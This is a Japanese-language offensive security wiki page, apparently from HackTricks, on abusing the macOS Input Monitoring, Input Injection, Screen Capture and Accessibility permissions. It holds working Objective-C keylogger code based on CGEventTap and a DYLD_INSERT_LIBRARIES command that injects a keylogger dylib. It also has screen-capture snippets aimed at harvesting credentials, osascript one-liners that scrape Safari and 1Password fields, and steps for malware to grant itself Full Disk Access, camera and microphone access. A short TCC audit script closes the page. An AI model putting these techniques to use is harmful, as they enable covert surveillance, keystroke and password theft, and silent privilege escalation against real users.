# macOS Input Monitoring、Screen Capture、Accessibilityの悪用

{{#include ../../../banners/hacktricks-training.md}}

## 概要

関連する3つのTCCサービスが、アプリケーションによるユーザーのデスクトップセッションの監視および操作方法を制御します。

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | システム全体のすべてのキーボードおよびマウスイベントを読み取る（keylogging） |
| `kTCCServicePostEvent` | **Input Injection** | 合成キーボードおよびマウスイベントを注入する |
| `kTCCServiceScreenCapture` | **Screen Capture** | ディスプレイバッファを読み取り、スクリーンショットを撮影し、画面を記録する |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement APIを介して他のアプリケーションを制御し、UI要素を読み取る |

これらの権限は、macOSにおける**最も危険な組み合わせ**です。組み合わせることで、以下が可能になります。

- すべてのキーストローク（パスワード、メッセージ、クレジットカード情報）の完全なkeylogging
- 画面に表示されるすべてのコンテンツのscreen recording
- 合成入力の注入（ボタンのクリック、ダイアログの承認）
- 物理アクセスと同等の完全なGUI制御

---

## Input Monitoring（kTCCServiceListenEvent）

### 仕組み

macOSは、Quartzイベントシステムから入力イベントを傍受するための**`CGEventTap` API**をプロセスに提供します。ListenEvent権限を持つプロセスは、すべてのキーボードおよびマウスイベントが対象アプリケーションに到達する前または後に受信するイベントtapを作成できます。<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitled Binariesの発見
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### 攻撃: Code Injection による Keylogging

ListenEvent permissionを持つbinaryで、**disabled library validation**または**DYLD environment variablesを許可**する設定になっている場合、攻撃者はCGEventTapを登録するdylibをinjectできます:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
注入された dylib は対象の ListenEvent TCC grant を継承し、すべてのキーストロークをキャプチャします。

### Attack: Credential Harvesting

高度な keylogger は、キーストロークとアクティブなアプリケーションを関連付けられます。
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### 仕組み

PostEvent permissionにより、ListenOnlyではなく **`kCGEventTapOptionDefault`**（イベントを変更・注入可能）を使用してevent tapを作成できます。<sup>[[1]](#references)</sup> これにより、以下が可能になります：
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 攻撃: Automated TCC Prompt Approval

PostEventを使用すると、攻撃者はTCC permission dialogsの「Allow」を**simulate clicking**できます。
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Screen Capture (kTCCServiceScreenCapture)

### 仕組み

画面収録の権限により、以下を使用してディスプレイバッファを読み取れます。
- **`CGWindowListCreateImage`** — 任意のウィンドウまたは画面全体をキャプチャ
- **`ScreenCaptureKit`** (macOS 12.3+) — 画面コンテンツをストリーミングする最新のAPI<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — ハードウェアアクセラレーション対応の画面キャプチャ
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### 画面キャプチャクライアントの特定
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

注入された screen capture process は、定期的にフレームをキャプチャし、OCR を使用してパスワードを抽出できます:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma**以降、screen captureではメニューバーに**常時表示されるインジケーター**が表示されます。古いバージョンでは、screen recordingを完全に無音で実行できました。ただし、短時間の単一フレームのcaptureであれば、ユーザーに気付かれない可能性があります。

### Attack: Session Recording

Continuous screen recording provides a complete replay of the user's session:

継続的なscreen recordingにより、ユーザーのセッションを完全に再生できます。
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## アクセシビリティ (kTCCServiceAccessibility)

### 仕組み

アクセシビリティ権限により、**AXUIElement API** を介して他のアプリケーションを制御できます。<sup>[[2]](#references)</sup> アクセシビリティ権限を持つプロセスは、以下を実行できます。

1. **任意のアプリケーションのUI要素を読み取る**（テキストフィールド、ラベル、ボタン、メニュー）
2. **ボタンをクリックし、コントロールを操作する**
3. **任意のテキストフィールドにテキストを入力する**
4. **メニューやダイアログを操作する**
5. **実行中の任意のアプリケーションから表示データをスクレイピングする**
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### 攻撃: Self-Granting TCC Permissions

最も危険なアクセシビリティの悪用は、**System Settingsを操作して、自身のmalwareに追加の権限を付与すること**です。<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 攻撃: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: 自動化されたユーザー操作
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 攻撃チェーン

### Chain: Input Monitoring + Screen Capture = 完全な監視
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = 完全なリモートコントロール
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: アクセシビリティ → Camera/Mic の自己付与 → 監視
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## 検出と列挙
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — macOSにおける合成イベントとユーザーインターフェースのセキュリティ](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
